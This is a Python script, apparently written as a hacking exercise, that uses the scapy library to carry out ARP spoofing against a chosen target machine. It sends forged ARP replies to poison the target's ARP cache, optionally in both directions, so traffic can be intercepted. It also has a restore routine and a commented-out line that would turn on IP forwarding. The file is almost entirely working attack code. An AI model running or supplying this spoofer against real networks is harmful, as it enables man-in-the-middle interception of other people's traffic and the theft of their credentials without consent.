import scapy.all as scapy
import argparse
import time
import subprocess


def collect_inputs():
    argument = argparse.ArgumentParser()

    argument.add_argument("-i", "--interface", dest="interface", help="Specify interface to run spoof through")
    argument.add_argument("-t", "--target", dest="target", help="Specify the target machine")

    argument.add_argument("-s", "--spoof", dest="spoof", help="Specify the address to spoof to the target")
    argument.add_argument("-w", "--two_way", dest="two_way", help="Whether you want to spoof in both directons")

    inputs = argument.parse_args()

    return inputs



def get_mac(ip_address):
    arp_instance = scapy.ARP(pdst=ip_address, hwdst="ff:ff:ff:ff:ff:ff")

    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    

    combined_packet = ether/arp_instance

    response = scapy.srp(combined_packet, timeout=5, verbose=False)
 
    
    
    for arp_packet in response[0]:
        arp_packet = arp_packet[1]

        
        return arp_packet.hwsrc



def restore():
    arp_reply = scapy.ARP(op=2, psrc=inputs.spoof, hwsrc=source_spoof_mac, pdst=inputs.target, hwdst=dest_target_mac)
    print(arp_reply.show())
    scapy.send(arp_reply, count=5)
    if inputs.two_way == "True":
        arp_reply_2 = scapy.ARP(op=2, psrc=inputs.target, hwsrc=dest_target_mac, pdst=inputs.spoof, hwdst=source_spoof_mac)
        print(arp_reply_2.show())
        scapy.send(arp_reply_2, count=5)
    print("[+] ARP Tables sucessfully restored :-D")


def begin_spoofing(interface, target, spoof, two_way):
    
    counter = 0
    try:
        while 1:
            
            arp_reply = scapy.ARP(psrc=inputs.spoof, pdst=inputs.target, op=2)
            
            scapy.send(arp_reply, verbose=False)
            
            counter += 1
            if inputs.two_way == "True":
                arp_reply_2 = scapy.ARP(psrc=inputs.target, pdst=inputs.spoof, op=2)
                scapy.send(arp_reply_2, verbose=False)
                counter += 1

            print(f"\rsent {counter} packets", end="")
            break;  # uncomment this if you want more arp packets to get sent out
            time.sleep(2)

    except KeyboardInterrupt:
        restore()
        

        ## ANOTHER WAY TO RESTORE ARP TABLES IS BELOW. SIMPLY STOP SENDING ARP RESPONSE PACKETS AND IN ABOUT 10 SECONDS EVERYTHING SHOULD GET TO NORMAL.
##        print("\n\n[+] You pressed Ctrl+C")
##        print("[+] Reverting changes and Restoring ARP tables .....")
##        time.sleep(5)
##        print("{+] Almost there .....")
##        time.sleep(2)
##        print("[+] Restored")


        
        
            
    

 

inputs = collect_inputs()

dest_target_mac = get_mac(inputs.target)
source_spoof_mac = get_mac(inputs.spoof)
print(dest_target_mac, source_spoof_mac)

##subprocess.run("ifconfig eth0")
##subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward")
begin_spoofing(inputs.interface, inputs.target, inputs.spoof, inputs.two_way)



